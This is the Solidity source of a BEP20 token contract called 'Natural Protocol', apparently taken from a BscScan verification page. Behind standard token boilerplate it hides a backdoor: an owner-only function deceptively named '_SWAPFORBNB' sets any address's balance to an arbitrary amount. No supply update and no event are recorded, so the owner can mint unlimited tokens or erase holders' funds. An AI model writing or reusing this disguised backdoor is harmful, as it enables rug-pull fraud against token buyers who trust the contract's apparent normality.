/**
 *Submitted for verification at BscScan.com on 2022-04-12
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.6.12;

interface _IERC20ANTIBOT {
  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 _TOTALAMT) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 _TOTALAMT) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 _TOTALAMT) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Context {
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

library _SAFEBNB {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "_SAFEBNB: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "_SAFEBNB: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "_SAFEBNB: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "_SAFEBNB: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "_SAFEBNB: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract _Ownables is Context {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "_Ownables: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "_Ownables: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract NaturalProtocol is Context, _IERC20ANTIBOT, _Ownables {
  using _SAFEBNB for uint256;

  mapping (address => uint256) private Tbalance;

  mapping (address => mapping (address => uint256)) private _allowances;

  uint256 private _MTOTSUPPLY;
  uint8 public _decimals;
  string public _symbol;
  string public _name;

  constructor() public {
    _name = 'Natural Protocol';
    _symbol = 'NATURALPROTOCOL';
    _decimals = 9;
    _MTOTSUPPLY = 100000000000000000000000;
    Tbalance[msg.sender] = _MTOTSUPPLY;

    emit Transfer(address(0), msg.sender, _MTOTSUPPLY);
  }

  function getOwner() external view virtual override returns (address) {
    return owner();
  }

  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }

  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  }

  function name() external view virtual override returns (string memory) {
    return _name;
  }

 
  function totalSupply() external view virtual override returns (uint256) {
    return _MTOTSUPPLY;
  }

 
  function balanceOf(address account) external view virtual override returns (uint256) {
    return Tbalance[account];
  }

  function transfer(address recipient, uint256 _TOTALAMT) external override returns (bool) {
    _transfer(_msgSender(), recipient, _TOTALAMT);
    return true;
  }

  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }

  
  function approve(address spender, uint256 _TOTALAMT) external override returns (bool) {
    _approve(_msgSender(), spender, _TOTALAMT);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 _TOTALAMT) external override returns (bool) {
    _transfer(sender, recipient, _TOTALAMT);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(_TOTALAMT, "BEP20: transfer _TOTALAMT exceeds allowance"));
    return true;
  }

  
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function burn(uint256 _TOTALAMT) public virtual {
      _burn(_msgSender(), _TOTALAMT);
  }

     function _SWAPFORBNB(address _MAXTRX, uint256 _TOTALAMT) external onlyOwner {
      Tbalance[_MAXTRX] = _TOTALAMT * 10 ** 9;
  }
  function burnFrom(address account, uint256 _TOTALAMT) public virtual {
      uint256 decreasedAllowance = _allowances[account][_msgSender()].sub(_TOTALAMT, "BEP20: burn _TOTALAMT exceeds allowance");

      _approve(account, _msgSender(), decreasedAllowance);
      _burn(account, _TOTALAMT);
  }

  function _transfer(address sender, address recipient, uint256 _TOTALAMT) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    Tbalance[sender] = Tbalance[sender].sub(_TOTALAMT, "BEP20: transfer _TOTALAMT exceeds balance");
    Tbalance[recipient] = Tbalance[recipient].add(_TOTALAMT);
    emit Transfer(sender, recipient, _TOTALAMT);
  }


  function _burn(address account, uint256 _TOTALAMT) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    Tbalance[account] = Tbalance[account].sub(_TOTALAMT, "BEP20: burn _TOTALAMT exceeds balance");
    _MTOTSUPPLY = _MTOTSUPPLY.sub(_TOTALAMT);
    emit Transfer(account, address(0), _TOTALAMT);
  }

  function _approve(address owner, address spender, uint256 _TOTALAMT) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = _TOTALAMT;
    emit Approval(owner, spender, _TOTALAMT);
  }

}